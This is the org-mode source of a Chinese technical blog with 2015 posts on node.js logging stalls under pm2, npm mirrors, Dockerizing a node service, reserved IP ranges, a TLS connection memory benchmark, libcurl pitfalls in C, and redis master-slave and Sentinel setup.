        还支持URL、GitHub URL、本地 URL，详见 [[https://docs.npmjs.com/files/package.json#urls-as-dependencies][URLs as Dependencies]]

** 参考

   - [[https://docs.npmjs.com/files/package.json][package.json | npm Documentation]]

   - [[http://blog.nodejitsu.com/package-dependencies-done-right/][Package.json dependencies done right | Nodejitsu Inc.]]

   - [[http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html][node.js 中的版本管理]]
* DONE node.js写日志堵塞问题                                           :node:
  CLOSED: [2015-12-12 Sat 20:19]

  今天遇到一起后台服务中断问题，原因是有一个服务写日志导致磁盘满，清掉日志释放磁盘空间后，服务无法自动恢复，此时有以下症状：

  - =node.js= 进程内存占用超高（超过1G），CPU占用超高（接近100%）

  - [[https://github.com/Unitech/pm2][pm2]] 运行异常
    
    =stop= 和 =delete= 操作会卡住， =start= 和 =restart= 操作失败。

    后台有大量 [[https://github.com/Unitech/pm2][pm2]] 进程，应该是 =crontab= 每分钟调用 =pm2 start= 确保服务拉起导致。

    =killall -9 node= 及 [[https://github.com/Unitech/pm2][pm2]] 仍然无法将服务恢复。

    =pm2 kill= 也会卡住，最终通过 =kill -9= 干掉 [[https://github.com/Unitech/pm2][pm2]] 的后台进程 =PM2 v0.14.3: God Daemon= 才把服务重新启动。


  一个小时后又出现险情，类似的症状，虽然没有严重到中断服务，但是 [[https://github.com/Unitech/pm2][pm2]] 失控很让人揪心，服务开了两个实例，其中一个实例状态：

  #+begin_example
    │ App name          │ id │ mode    │ pid │ status  │ restart │ uptime │ memory │ watching │
    │ xxx.xxxxxxxxx.com │ 0  │ cluster │ N/A │ errored │ 2       │ 0      │ 0 B    │ disabled │
  #+end_example

  执行 =pm2 delete 0= 也是挂住，最终还是通过 =kill -9= 干掉 [[https://github.com/Unitech/pm2][pm2]] 的后台进程 =PM2 v0.14.3: God Daemon= 才把服务重新启动。

  =top= 看到的进程状态：

  #+begin_example
     PID USER      PR  NI  VIRT  RES  SHR S %CPU   %MEM  TIME+   COMMAND           
    1640 nobody    20   0  793m 149m 8468 R 105.5  0.9   0:34.74 node /usr/local  
    1649 nobody    20   0  796m 152m 8472 R 103.6  1.0   0:34.78 node /usr/local  
  #+end_example

  服务输出的日志量在每秒700行（每行不超过120个字符）左右，最终将日志级别调到 =error= ，几乎不再输出日志，方才将CPU占用降下来：

  #+begin_example
        PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM  TIME+    COMMAND           
    3527 nobody       20   0  829m 185m 8476 R 62.3  1.2  30:41.12 node /usr/local
    3537 nobody       20   0  825m 181m 8476 R 60.4  1.1  30:45.96 node /usr/local
  #+end_example


   我使用的日志模块为 [[https://github.com/baryon/tracer][tracer]] ，简单地通过 =tracer.console(options)= 实例化全局的日志对象，最终写日志调用的是 =console.log= 。

   在上层，我使用 [[https://github.com/Unitech/pm2][pm2]] 来做进程管理，使用以下参数启动我的服务：
   
   #+begin_example
     pm2 -n xxx.xxxxxxxxx.com -l /usr/local/xxx.xxxxxxxxx.com/run.log --merge-logs start /usr/local/xxx.xxxxxxxxx.com/src/index.js -i 2
   #+end_example

   通过 =pm2 describe xxx.xxxxxxxxx.com= 输出可以发现最终会写三个日志文件：

   #+begin_example
     │ entire log path   │ /usr/local/xxx.xxxxxxxxx.com/run.log             │
     │ error log path    │ /root/.pm2/logs/xxx.xxxxxxxxx.com-error.log      │
     │ out log path      │ /root/.pm2/logs/xxx.xxxxxxxxx.com-out.log        │
   #+end_example

   根据 [[https://nodejs.org/docs/latest-v0.12.x/api/console.html#console_console][console的文档]] 中的描述：
   
   #+begin_quote
   The console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).

   如果输出目标为终端或文件时，console函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。
   #+end_quote

   这个特性引起的问题我也在另一篇文章《 [[http://blog.kankanan.com/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html][process.exit导致的控制台输出不全]] 》里有提及。

   也就是说不出意外的话，我们的服务写日志是阻塞式的，每秒钟同步方式写700行日志到一块普通机械硬盘上， =node.js= 不卡死才怪，更何况这块硬盘上还在被其它服务频繁读写。

   一个服务运行过程中不写日志文件是不可能的，在 =node.js= 写日志方面需要找到更优的方案。

   但是在寻找更好的方案之前，我做了一个常识性的思考：

   #+begin_quote
   将应用程序日志写到磁盘文件的模块，除非它丢弃日志，当磁盘写入无法跟上日志产生的速度，就要暂存到某个地方，它可能是本机的内存或连网的另一台机器。
   #+end_quote

   所以我最终要找的，不仅仅是一个异步写日志文件的模块，还要先减少磁盘写入量，或者日志不直接写到磁盘文件，而是发送到一个日志服务，如果日志是写在本地磁盘，最好能够做到磁盘满时不中断服务，这种情况下丢失日志也是可以接受的。

* DONE 使用国内镜像加速npm                                             :node:
  CLOSED: [2015-12-16 Wed 17:42]

  使用 =npm= 安装 =node.js= 包时会很慢，使用国内镜像可以提高速度。

  - 方式一

    #+begin_src sh
      npm install --registry=https://registry.npm.taobao.org
    #+end_src

  - 方式二

    #+begin_src sh
      export npm_config_registry=https://registry.npm.taobao.org
      npm install
    #+end_src

  - 方式三
    
    #+begin_src sh
      npm config set registry=https://registry.npm.taobao.org
      npm install
    #+end_src

    使用 =yarn=
    #+begin_src sh
      yarn config set registry https://registry.npm.taobao.org
      yarn install
    #+end_src

  最后再推荐一下 [[http://npm.taobao.org/][淘宝 NPM 镜像]] ，不但有 =npm= 的镜像，还有 [[http://npm.taobao.org/mirrors/node][node.js镜像]] ，以后安装 =node.js= 可以更方便了。

* DONE node.js服务迁移到docker容器                              :node:docker:
  CLOSED: [2015-12-17 Thu 16:54]

  这是一篇 =docker= 实践教程，将 [[https://github.com/tangxinfa/upload-fiddle][tangxinfa/upload-fiddle]] 这个 =node.js= 服务封装成 =docker= 容器。
  相关代码已提交到 [[https://github.com/tangxinfa/upload-fiddle][tangxinfa/upload-fiddle]] 项目。

** 编写 =Dockerfile=

   #+begin_example -n -r
     FROM dl.dockerpool.com:5000/ubuntu:14.04    (ref:dockerpool)

     MAINTAINER tangxinfa <tangxinfa@gmail.com>

     # Change apt sources
     ADD .docker/sources.list /etc/apt/sources.list  (ref:163-ubuntu)

     # Install python
     RUN \
         apt-get update && apt-get -y -qq install python wget

     # Install node
     RUN \
         wget http://npm.taobao.org/mirrors/node/v0.12.9/node-v0.12.9-linux-x64.tar.gz &&\
         tar xzf node-v0.12.9-linux-x64.tar.gz -C /usr/local

     WORKDIR /usr/local/upload-fiddle/

     # Install node modules
     ADD package.json ./
     ADD *.bashrc ./
     RUN \
         ln -s /usr/local/node-v0.12.9-linux-x64 ./node
     RUN \
         ["/bin/bash", "-c", "source .bashrc; npm install --registry=https://registry.npm.taobao.org"]   (ref:npm-taobao)

     # Add project files
     COPY src ./src
     COPY config ./config
     ADD *.sh ./
     ADD public/*.html ./public/

     # Create directory for upload files.
     RUN \
         mkdir public/files &&\
         chmod a+w public/files

     # Start service.
     CMD ["/bin/bash", "-c", "./start.sh && read"]   (ref:read)
   #+end_example

   - 配置行 [[(dockerpool)]] :: 在官方仓库被墙的大环境下，使用 =dockerpool.com= 提供的镜像
     
   - 配置行 [[(163-ubuntu)]] :: 使用163的ubuntu源，提高速度

   - 配置行 [[(npm-taobao)]] :: 使用taobao的npm源，提高速度

   - 配置行 [[(read)]] :: 调用read命令避免命令退出导致容器停止

** 创建 =docker= 镜像

   #+begin_src sh
     sudo docker build -t 'tangxinfa/upload-fiddle:0.0.1' .
   #+end_src
  
** 运行 =docker= 容器

   #+begin_src sh
     sudo docker run -idt --name='upload-fiddle' -p 127.0.0.1:80:80 'tangxinfa/upload-fiddle:0.0.1'
   #+end_src

   现在可以通过浏览器访问服务了：[[http://localhost/]]

** 打开 =docker= 容器终端查看运行日志

   #+begin_src sh
     sudo docker exec -ti upload-fiddle /bin/bash
     tail -f run.log
   #+end_src

   直接 =exit= 退出终端不会停止容器。
* DONE docker容器数据持久化                                          :docker:
  CLOSED: [2015-12-17 Thu 23:24]

  在上一篇文章《 [[http:node.js-670d52a18fc179fb5230-docker-5bb95668.html][node.js服务迁移到docker容器]] 》中，当容器被删除之后上传的文件将丢失，可以新建一个数据卷容器专门用来保存上传的文件，这个数据卷容器可以为多个应用容器提供数据持久化功能。

  其实也可以挂载本地文件目录做为容器的数据卷，但使用数据卷容器更规范一些。

** 创建数据卷容器

   #+begin_src sh
     sudo docker run -d -v /usr/local/upload-fiddle/public/files --name upload-fiddle-data 'dl.dockerpool.com:5000/ubuntu:14.04' echo 'upload-fiddle data container'
   #+end_src

   数据卷容器不需要运行以节约资源，它存在的目的只是对数据卷进行引用，避免数据卷被意外删除。

** 挂载数据卷容器

   #+begin_src sh
     sudo docker run -idt --name='upload-fiddle' -p 127.0.0.1:80:80 --volumes-from upload-fiddle-data 'tangxinfa/upload-fiddle:0.0.1'
   #+end_src

   使用 =--volumes-from= 选项引用容器中的数据卷。

** 数据卷容器数据存储位置

   查看数据卷容器挂载信息

   #+begin_src sh
     sudo docker inspect -f {{.Mounts}} upload-fiddle-data
   #+end_src

   可以看到数据存储在宿主机的 =/var/lib/docker/volumes/= 目录下。

   数据卷只有当最后一个引用它的容器使用 =-v= 选项进行删除（ =docker rm= 命令）时，才会被删除。

   可以使用 =docker volume= 命令对数据卷进行管理。

** 参考

   《[[http://container-solutions.com/understanding-volumes-docker/][Understanding Volumes in Docker - Container Solutions]]》
* DONE 内网IP段有哪些                                               :network:
  CLOSED: [2015-12-18 Fri 14:39]

  常见的内网IP段有：
  
  - 10.0.0.0/8 :: 10.0.0.0 - 10.255.255.255

  - 172.16.0.0/12 :: 172.16.0.0 - 172.31.255.255

  - 192.168.0.0/16 :: 192.168.0.0 - 192.168.255.255

  以上三个网段分别属于A、B、C三类IP地址，来自 《[[https://tools.ietf.org/html/rfc1918][RFC 1918]]》。

  但是根据 《[[https://en.wikipedia.org/wiki/Reserved_IP_addresses][Reserved IP addresses - Wikipedia, the free encyclopedia]]》 及《[[https://tools.ietf.org/html/rfc6890][RFC 6890 - Special-Purpose IP Address Registries]]》的描述，
  还有很多其它的内网IP段（包括IPv6），以及其它用途的保留IP地址。

  其它IPv4内网段罗列如下：
  
  - 0.0.0.0/8 :: 0.0.0.0 - 0.255.255.255

                 用于当前网络内的广播消息。

  - 100.64.0.0/10 :: 100.64.0.0 - 100.127.255.255
    
                     由运营商使用的私网IP段，随着IPv4地址池的耗光，会有更多用户被分配到这个网段。

  - 127.0.0.0/8 :: 127.0.0.0 - 127.255.255.255
                   
                   本机回环地址。

  - 169.254.0.0/16 :: 169.254.0.0 - 169.254.255.255

                      获取不到IP地址时使用，通常因为从DHCP服务器获取不到IP。

  - 192.0.0.0/24 :: 192.0.0.0 - 192.0.0.255

                    Used for the IANA IPv4 Special Purpose Address Registry as specified by RFC 5736

                    一般用户不可能被分配到这个IP段。

  - 192.0.2.0/24 :: 192.0.2.0 - 192.0.2.255
                    
                    Assigned as "TEST-NET" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.

                    一般用户不可能被分配到这个IP段。

  - 198.18.0.0/15 :: 198.18.0.0 - 198.19.255.255

                     用于测试两个独立子网的网间通信。

                     一般用户不可能被分配到这个IP段。

  - 198.51.100.0/24 :: 198.51.100.0 - 198.51.100.255
    
                       Assigned as "TEST-NET-2" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.
       
                       一般用户不可能被分配到这个IP段。
                       
  - 203.0.113.0/24 :: 203.0.113.0 - 203.0.113.255

                      Assigned as "TEST-NET-3" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.

                      一般用户不可能被分配到这个IP段。

  - 255.255.255.255/32 :: 255.255.255.255

                          本网段的广播地址。
* DONE tls连接内存占用                                                 :node:
  CLOSED: [2015-12-21 Mon 00:17]

  我们有一个 =node.js= 服务，有大量 =tls= 长连接，跑了一段时间后发现内存消耗比较大，每个 =node.js= 实例维持 =3000= 个连接需要消耗 =1G= 略多的内存，但是也不能确定有内存泄露，毕竟内存没有再往上涨导致服务中断，所以觉得有必要测试一下 =tls= 连接的内存消耗情况。

** tls服务器

   #+begin_src js
     var tls         = require('tls'),
         fs          = require('fs');


     var options = {
         key: fs.readFileSync('server.key'),
         cert: fs.readFileSync('server.cert'),
         handshakeTimeout: 10*1000,
         plain: true,
         ssl: true
     };

     var port = 1234;
     var tlsServer = tls.createServer(options, function (socket) {
         socket.on("close", function () {
             console.warn('tls client(' + socket.remoteAddress + ':' + socket.remotePort +') closed');
         });
     }).listen(port, "0.0.0.0", function(){
         console.log('tls server listening on port(' + port + ')');
     });
     tlsServer.maxConnections = 10000;
     tlsServer.on('clientError', function (exception, socket) {
         console.warn('tls client(' + socket.remoteAddress + ':' + socket.remotePort +') error(' + exception + ')');
         socket.destroy();
     });

     function memoryUsage() {
         var mem = process.memoryUsage();
         var format = function(bytes) {
             return (bytes/1024/1024).toFixed(2)+'MB';
         };
         console.log('Process: heapTotal '+format(mem.heapTotal) + ' heapUsed ' + format(mem.heapUsed) + ' rss ' + format(mem.rss));
     }

     setInterval(function () {
         tlsServer.getConnections(function (err, tlsCount) {
             if (err) {
                 console.error("get tls connections count error(" + err.toString() + ")");
             }

             console.warn("server: tls connections(" + tlsCount + ")");

             memoryUsage();
         });
     }, 1*1000);
   #+end_src

** tls客户端

   #+begin_src js
     var tls = require('tls');

     var tlsCount = 0;

     function connect() {
         var socket = tls.connect(1234, {rejectUnauthorized: false}, function () {
             tlsCount += 1;
             socket.setEncoding('utf8');
             socket.on('data', function(data) {
             });
             socket.on('close', function() {
                 tlsCount -= 1;
             });
         });
     }

     function memoryUsage() {
         var mem = process.memoryUsage();
         var format = function(bytes) {
             return (bytes/1024/1024).toFixed(2)+'MB';
         };
         console.log('Process: heapTotal '+format(mem.heapTotal) + ' heapUsed ' + format(mem.heapUsed) + ' rss ' + format(mem.rss));
     }

     var round = 0;
     setInterval(function () {
         if (round < 10) {
             for(var i = 0; i < 100; ++i) {
                 connect();
             }
             round += 1;
         }

         console.warn("client: tls connections(" + tlsCount + ")");

         memoryUsage();
     }, 1000);
   #+end_src

** tls服务器日志

   连接从 =0= 到 =1000= 内存增长

   #+begin_example
     server: tls connections(0)
     Process: heapTotal 9.14MB heapUsed 4.80MB rss 23.69MB
     server: tls connections(100)
     Process: heapTotal 10.13MB heapUsed 5.59MB rss 29.53MB
     server: tls connections(200)
     Process: heapTotal 10.13MB heapUsed 6.75MB rss 32.32MB
     server: tls connections(300)
     Process: heapTotal 9.18MB heapUsed 7.32MB rss 34.37MB
     server: tls connections(400)
     Process: heapTotal 10.16MB heapUsed 8.11MB rss 37.05MB
     server: tls connections(500)
     Process: heapTotal 11.14MB heapUsed 8.66MB rss 38.18MB
     server: tls connections(600)
     Process: heapTotal 11.14MB heapUsed 9.48MB rss 39.73MB
     server: tls connections(600)
     Process: heapTotal 12.12MB heapUsed 9.62MB rss 40.50MB
     server: tls connections(700)
     Process: heapTotal 15.04MB heapUsed 10.16MB rss 42.69MB
     server: tls connections(800)
     Process: heapTotal 18.97MB heapUsed 10.72MB rss 44.50MB
     server: tls connections(900)
     Process: heapTotal 18.97MB heapUsed 11.68MB rss 46.30MB
     server: tls connections(1000)
     Process: heapTotal 18.97MB heapUsed 12.63MB rss 47.32MB
   #+end_example

   tls客户端结束后连接数从 =1000= 降到 =0= 约 =30= 秒后

   #+begin_example
     server: tls connections(0)
     Process: heapTotal 22.91MB heapUsed 13.63MB rss 48.44MB
   #+end_example

   从上面的日志可以计算出：

   - 每 =tls= 连接 =rss= 要消耗 =24.2KB=  =heap= 要消耗 =8KB=

   - 连接关闭后内存没有释放
     
     还略有增加，要么就是 =node.js= 没有释放 =tls= 连接的内存（应该不太可能），要么就是我的代码有问题，没有释放资源

   使用 =heapdump= 导出堆数据后通过 =Chromium= 的开发工具进行分析，发现事情没这么简单，占用的内存绝大部分是代码，
   =tls= 服务器不退出，使用 =tls= 客户端测试多轮后可以发现 =rss= 内存占用不会增加， =tls= 客户端退出关闭所有连接后，
   =rss= 内存占用总是会恢复到同一水平，这就说明代码是没有问题的，应该不存在内存泄露。

   多轮测试后重新取样：

   #+begin_example
     server: tls connections(0)
     Process: heapTotal 21.93MB heapUsed 13.22MB rss 54.06MB
     server: tls connections(100)
     Process: heapTotal 21.93MB heapUsed 14.16MB rss 54.06MB
     server: tls connections(200)
     Process: heapTotal 25.86MB heapUsed 14.79MB rss 58.57MB
     server: tls connections(300)
     Process: heapTotal 25.86MB heapUsed 15.76MB rss 59.08MB
     server: tls connections(400)
     Process: heapTotal 25.86MB heapUsed 16.69MB rss 59.08MB
     server: tls connections(500)
     Process: heapTotal 27.83MB heapUsed 16.72MB rss 60.37MB
     server: tls connections(600)
     Process: heapTotal 27.83MB heapUsed 17.65MB rss 60.37MB
     server: tls connections(700)
     Process: heapTotal 33.74MB heapUsed 15.76MB rss 59.32MB
     server: tls connections(800)
     Process: heapTotal 33.74MB heapUsed 16.71MB rss 59.32MB
     server: tls connections(800)
     Process: heapTotal 33.74MB heapUsed 16.83MB rss 59.32MB
     server: tls connections(900)
     Process: heapTotal 33.74MB heapUsed 18.31MB rss 59.38MB
     server: tls connections(1000)
     Process: heapTotal 33.74MB heapUsed 19.24MB rss 59.38MB
   #+end_example

   从上面的日志可以计算出：

   - 每 =tls= 连接 =rss= 要消耗 =5.45KB= ， =heap= 要消耗 =6.16KB=

   也就是说正常情况下， =3000= 个 =tls= 连接， =rss= 会消耗 =16MB= ， =heap= 会消耗 =18MB= ，占用 =1G= 的问题肯定出在其它地方。

   另外注意到调用 =heapdump.writeSnapshot= 后内存占用大幅下降，应该是 =heapdump= 触发了 =v8= 的垃圾回收， =v8= 的垃圾回收应该不是实时精确的，要精确测量内存占用，估计也要像 =heapdump= 一样让 =v8= 将全部垃圾回收后再测量。

** 不同版本的node.js结果会有差异

   为了完全模拟真实环境，针对每一个接收的 =tls= 连接，除了 =close= ，还监听了 =data= 、 =error= 、 =timeout= 事件：

   #+begin_src js
     socket.on("data", function (data) {

     });
     socket.on("error", function (err) {
         console.warn('tls client(' + socket.remoteAddress + ':' + socket.remotePort +') error(' + err.toString() + ')');
     });
     socket.on("close", function () {
         console.warn('tls client(' + socket.remoteAddress + ':' + socket.remotePort +') closed');
     });
     socket.on("timeout", function () {
         socket.destroy();
     });
   #+end_src

   前面的测试我使用的是 =node-v5.3.0= ，我使用 =node-v0.12.7= 重新测了几轮，最终 =rss= 内存占用停在 =145.5MB= ，这还只是 =1000= 个 =tls= 连接，使用 =3000= 个 =tls= 连接进行测试， =rss= 内存占用停在 =303MB= 。再次使用 =node-v5.3.0= 测试 =3000= 个 =tls= 连接， =rss= 内存占用停在 =115MB - 130MB= 之间，随着连接的增减有一定的波动。

   由此看来 =tls= 连接是要占用一定内存量的，高版本的 =node= 改进很大，可以考虑升级一下 =node= 。

** 最后附上 node.js 各个版本的测试结果

   #+CAPTION: 10000 tls connections
   |--------------+---------------+--------------+---------|
   | node.js      | heapTotal(MB) | heapUsed(MB) | rss(MB) |
   |--------------+---------------+--------------+---------|
   | node-v0.12.7 |        158.34 |        98.62 |  728.26 |
   | node-v0.12.9 |        239.04 |       209.53 |  838.40 |
   | node-v4.2.3  |         86.58 |        81.47 |  222.97 |
   | node-v5.3.0  |         96.73 |        75.23 |  235.11 |
   |--------------+---------------+--------------+---------|

   - 测试脚本

     [[file:../static/test_tls_server.js][test_tls_server.js]]

     [[file:../static/test_tls_client.js][test_tls_client.js]]

   - 测试命令

     终端 =1= ( =tls= 服务器)

     #+begin_src sh
       sudo bash -c "(ulimit -n 10240; node ./test_tls_server.js)"
     #+end_src
     
     终端 =2= ( =tls= 客户端)
     
     #+begin_src sh
       sudo bash -c "(ulimit -n 10240; for (( i = 0; i < 100; i++)); do echo round \$i; node ./test_tls_client.js; done;)"
     #+end_src
     
     内存占用取的是 =tls= 测试客户端退出后，服务器端最后建立了 =10000= 个 =tls= 连接时的内存占用。
* DONE 安全使用libcurl的正确姿势                                          :c:
  CLOSED: [2015-12-21 Mon 18:14]

  在我们的项目中，数次遇到 =libcurl= 导致的应用程序崩溃问题，这里总结了一下使用 =libcurl= 的正确姿势。

  #+begin_src c -n -r
    #include <curl/curl.h>
    #include <stdint.h>
    #include <string.h>


    #define RESPONSE_BODY_SIZE 128

    static size_t write_function(const void *buffer, const size_t size, const size_t nmemb, void *user_p)
    {
        char* response_body = (char*)user_p;
        uint32_t response_body_len = strlen(response_body);
        uint32_t len = size*nmemb;
        if (len > RESPONSE_BODY_SIZE - response_body_len - 1) {
            len = RESPONSE_BODY_SIZE - response_body_len - 1;
        }
        memcpy(response_body + response_body_len, buffer, len); (ref:curl_write_function_buffer)
        return size*nmemb; (ref:curl_write_function_return)
    }

    int main(int argc, char *argv[])
    {
        const char* url = "http://www.example.com/dns_servers";
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        const char* request_body = "{\"host\": \"8.8.8.8\", \"port\": 53}";

        CURL *curl;
        CURLcode res;
        char response_body[RESPONSE_BODY_SIZE] = {'\0'};
        long response_code = 0;

        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_body);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(request_body));
            curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);  (ref:curl_nosignal)
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_body);
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);  (ref:curl_response_code)
            }
            if(res != CURLE_OK) {
                fprintf(stderr, "request to %s error(%d): %s", url, res, curl_easy_strerror(res));
            }
            curl_easy_cleanup(curl);
        }

        curl_slist_free_all(headers);
        if (response_code == 201) {
            fprintf(stderr, "request to %s successful: %s\n", url, response_body);
            return 0;
        }

        fprintf(stderr, "request to %s response failed(%ld): %s\n", url, response_code, response_body);
        return 1;
    }
  #+end_src

  上面的示例代码要注意的地方：

  - 行 [[(curl_write_function_buffer)]] :: buffer不是 =\0= 结尾的

  - 行 [[(curl_write_function_return)]] :: 总是返回 =size*nmemb=

  - 行 [[(curl_nosignal)]] :: 总是设置这个选项
    
       =libcurl= 不支持异步 =dns= 解析时，会通过 =signal= 的方式实现 =dns= 解析设置超时， =signal= 会导致多线程程序崩溃，后台服务通常都是多线程的，所以应该总是设置这个选项（但是 =libcurl= 不支持异步 =dns= 解析时，超时选项将被忽略）。

       可以通过运行 =curl --version= 命令或调用 =curl_version= 函数查看 =libcurl= 是否支持异步 =dns= 解析，调用 =curl_version_info= 函数还可以获得具体的 =c-ares= 库版本号。
       
       编译 =libcurl= 时，通过为  =configure= 指定 =--enable-threaded-resolver= 或 =--enable-ares= 选项启用异步 =dns= 解析。

  - 行 [[(curl_response_code)]] :: 状态响应码变量必须是 =long= 类型

       否则会由于内存越界导致程序崩溃。
* DONE redis高可用性基础：Master-Slave                                :redis:
  CLOSED: [2015-12-25 Fri 21:19]

** 理解Master-Slave

   =Master-Slave= 常常翻译为 =主/备= ，是一种高可用性（ [[https://en.wikipedia.org/wiki/High_availability][High Availability]] ）方案。

   举个生活中的 =Master-Slave= 例子：

   #+begin_quote
   参加考试的时候，我们会准备两支钢笔，正常情况下我们只会使用一支，出问题了才会换另外一支。
   #+end_quote

   所以实施 =Master-Slave= 是有成本的，至少会有 =50%= 的资源浪费（多备几支浪费会更多），可以让 =Slave= 承担一部分工作来充分利用资源。

** Redis的Master-Slave

   关于 =Redis= 的 =Master-Slave= ，《[[http://redis.io/topics/replication][Replication – Redis]]》 有详尽描述。

   需要注意的是 =Redis= 的 =Master-Slave= 不能保证绝对不丢数据，而是丢失一小段时间内（如：1秒钟）的数据。

   下面开始 =Redis= 的 =Master-Slave= 实践，使用的 =redis= 版本为 =3.0.6= 。

*** 创建Master结点

    - redis配置文件
      
      从 =/etc/redis.conf= 拷贝一份进行修改，无关的配置项已去掉，使用默认值即可。
      
      [[file:../static/redis-master.conf][redis-master.conf]]
      
    - 在终端 =1= 启动 =Master= 结点
      
      =redis-server ./redis-master.conf=

    - 使用 =redis-cli= 连接 =Master=

      #+begin_example
        $ redis-cli -p 6379
        127.0.0.1:6379>
      #+end_example

*** 创建Slave结点

    - redis配置文件

      从 =redis-master.conf= 拷贝一份进行修改，主要是修改监听的端口号（ =6380= ）、PID文件名、DB文件名，

      最关键的是设置为 =Master= 的 =Slave= =slaveof 127.0.0.1 6379= 。

      [[file:../static/redis-slave.conf][redis-slave.conf]]
      
    - 在终端 =2= 启动 =Slave= 结点
      
      =redis-server ./redis-slave.conf=
      
    - 使用 =redis-cli= 连接 =Slave=

      #+begin_example
        $ redis-cli -p 6380
        127.0.0.1:6380>
      #+end_example

*** 演示Master写Slave读的场景

    - 在 =Master= 写入

      #+begin_example
        127.0.0.1:6379> set hello world
        OK
      #+end_example

    - 从 =Slave= 读取

      #+begin_example
        127.0.0.1:6380> get hello
        "world"
      #+end_example

*** 演示Slave挂掉的场景

    - 关闭 =Slave= 
      
      #+begin_example
        127.0.0.1:6380> shutdown
        not connected>
      #+end_example
      
      终端 =2= 上的 =redis-server= 会自动退出，注意到它退出前进行了存盘。

    - 在 =Master= 写入

      #+begin_example
        127.0.0.1:6379> set hello redis
        OK
      #+end_example

    - 在终端 =2= 上再次启动 =Slave=
      
      #+begin_src sh
        redis-server ./redis-slave.conf
      #+end_src
      
      从日志上可以看到 =Slave= 从 =Master= 重新进行了数据同步。

    - 在 =Slave= 上读取

      #+begin_example
        not connected> get hello
        "redis"
        127.0.0.1:6380> 
      #+end_example

*** 演示Master挂掉的场景

    - 关闭 =Master=

      #+begin_example
        127.0.0.1:6379> shutdown
        not connected>
      #+end_example
      
      终端 =1= 上的 =redis-server= 会自动退出，注意到它退出前进行了存盘， 终端 =2= 上的 =Slave= 在不断尝试重连 =Master= 。
      
    - Master-Slave角色切换

      将运行中的原 =Slave= 提升为新 =Master=

      #+begin_example
        127.0.0.1:6380> slaveof no one
        OK
      #+end_example
    
      修改原 =Slave= 的配置文件 =redis-slave.conf= 删除配置 =#slaveof 127.0.0.1 6379=

      修改原 =Master= 的配置文件 =redis-master.conf= 添加配置 =slaveof 127.0.0.1 6380=

    - 在新 =Master= 写入

      #+begin_example
        127.0.0.1:6380> set hello master-slave
        OK
      #+end_example

    - 在终端 =1= 上再次启动原 =Master= 
      
      #+begin_src sh
        redis-server ./redis-master.conf
      #+end_src
      
      从日志上可以看到它现在是 =Slave= 角色了，反而从原 =Slave= 同步数据。

    - 在原 =Master= 上读取

      #+begin_example
        not connected> get hello
        "master-slave"
        127.0.0.1:6379>
      #+end_example

*** 总结

    =Redis= 的 =Master-Slave= 是一种动态关系，角色（ =Master= 、 =Slave= ）会互相转换，角色转换过程中必须严格按照步骤来，操作不当可能导致数据丢失。

    后面会发文介绍自动进行这种切换的工具 =Redis Sentinel= ，以及当 =Master-Slave= 发生切换后，应用程序该如何重连到新的 =Master= 。
    
** 参考

   [[https://en.wikipedia.org/wiki/Master/slave_%28technology%29][Master/slave (technology) - Wikipedia, the free encyclopedia]]
   
   [[http://redis.io/topics/replication][Replication – Redis]]

   [[http://www.tuicool.com/articles/2QbABj][Redis slave切换为master操作（不停机） - 推酷]]

* DONE redis高可用性方案：Sentinel                                    :redis:
  CLOSED: [2015-12-26 Sat 22:54]
  
  在前面一篇文章《 [[http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html][redis高可用性基础：Master-Slave]] 》中，主备切换过程时有好几个步骤，需要人工介入，这势必增加服务的故障时间（Down Time）。

  而 =Sentinel= 正是自动化这一过程的官方工具，详细文档请参考《[[http://redis.io/topics/sentinel][Redis Sentinel Documentation – Redis]]》。

** =Sentinel= 的功能

   - 监控

     =Sentinel= 不断地检测 =Master= 和 =Slave= 实例的运行状态。

   - 通知
     
     =Sentinel= 通过API，能够通知系统管理员、其它程序：监控的Redis实例出问题了。

   - 自动故障切换
     
     如果 =Master= 实例出问题了， =Sentinel= 通过将一个 =Slave= 实例提升为 =Master= 修复故障，其它 =Slave= 实例使用新的 =Master= 实例，同时通知给使用Redis服务的应用程序以便重新建立连接。

   - 配置提供者
     
     =Sentinel= 做为客户端服务发现的权威来源：客户端连接到 =Sentinel= 以获取当前 =Master= 的地址，故障切换后报告新的地址。

** =Sentinel= 演示

   =Redis Sentinel= 推荐的配置为至少三个Sentinel部署在三台不同的机器上，只配一台自已本身就是单点没有意义，二台时可能出现“脑裂”。

   - 启动上一篇文章《 [[http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html][redis高可用性基础：Master-Slave]] 》配置好的 =Master= 及 =Slave= Redis实例

     =Master= 监听在 =6379= 端口， =Slave= 监听在 =6380= 端口。

   - 使用端口号 =5000= =5001= =5002= 创建三个 =Sentinel= 实例

     =Sentinel= 实例 =a= 的配置文件 =redis-sentinel-a.conf=

     #+begin_example
       port 5000
       sentinel monitor mymaster 127.0.0.1 6379 2
       sentinel down-after-milliseconds mymaster 5000
       sentinel failover-timeout mymaster 60000
       sentinel parallel-syncs mymaster 1
     #+end_example

     其它两个 =Sentinel= 实例 =b= =c= 配置和 =a= 基本一样，只是端口号分别为 =5001= 和 =5002= ：

       [[file:../static/redis-sentinel-a.conf][redis-sentinel-a.conf]]

       [[file:../static/redis-sentinel-b.conf][redis-sentinel-b.conf]]

